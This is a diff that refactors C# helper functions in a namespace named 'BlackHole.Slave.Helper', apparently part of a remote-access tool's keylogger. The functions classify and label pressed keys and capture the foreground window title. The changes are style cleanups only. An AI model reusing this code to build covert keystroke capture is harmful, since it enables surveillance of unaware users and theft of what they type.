@@ -19,25 +19,25 @@ namespace BlackHole.Slave.Helper
                 || pressedKeys.Contains(Keys.Alt));
         
         public static bool IsModifierKey(this Keys key) =>
-            (key == Keys.LControlKey
-                || key == Keys.RControlKey
-                || key == Keys.LMenu
-                || key == Keys.RMenu
-                || key == Keys.LWin
-                || key == Keys.RWin
-                || key == Keys.Control
-                || key == Keys.Alt);
+            key == Keys.LControlKey
+            || key == Keys.RControlKey
+            || key == Keys.LMenu
+            || key == Keys.RMenu
+            || key == Keys.LWin
+            || key == Keys.RWin
+            || key == Keys.Control
+            || key == Keys.Alt;
         
         public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c) => pressedKeys.Contains((Keys)char.ToUpper(c));
 
         public static bool IsExcludedKey(this Keys k) =>
-            (k >= Keys.A && k <= Keys.Z
-                      || k >= Keys.NumPad0 && k <= Keys.Divide
-                      || k >= Keys.D0 && k <= Keys.D9
-                      || k >= Keys.Oem1 && k <= Keys.OemClear
-                      || k >= Keys.LShiftKey && k <= Keys.RShiftKey
-                      || k == Keys.CapsLock
-                      || k == Keys.Space);
+            k >= Keys.A && k <= Keys.Z
+            || k >= Keys.NumPad0 && k <= Keys.Divide
+            || k >= Keys.D0 && k <= Keys.D9
+            || k >= Keys.Oem1 && k <= Keys.OemClear
+            || k >= Keys.LShiftKey && k <= Keys.RShiftKey
+            || k == Keys.CapsLock
+            || k == Keys.Space;
 
         public static bool DetectKeyHolding(List<char> list, char search) => list.FindAll(s => s.Equals(search)).Count > 1;
 
@@ -46,11 +46,11 @@ namespace BlackHole.Slave.Helper
             string name = key.ToString();
             if (name.Contains("ControlKey"))
                 return "[Control]";
-            else if (name.Contains("Menu"))
+            if (name.Contains("Menu"))
                 return "[Alt]";
-            else if (name.Contains("Win"))
+            if (name.Contains("Win"))
                 return "[Win]";
-            else if (name.Contains("Shift"))
+            if (name.Contains("Shift"))
                 return "[Shift]";
             return name;
         }
@@ -58,13 +58,10 @@ namespace BlackHole.Slave.Helper
         public static string GetActiveWindowTitle()
         {
             StringBuilder sbTitle = new StringBuilder(1024);
-
-            User32.GetWindowText(User32.GetForegroundWindow(), sbTitle,
-                sbTitle.Capacity);
+            User32.GetWindowText(User32.GetForegroundWindow(), sbTitle, sbTitle.Capacity);
 
             string title = sbTitle.ToString();
-
-            return (!string.IsNullOrEmpty(title)) ? title : null;
+            return !string.IsNullOrEmpty(title) ? title : null;
         }
     }
 }
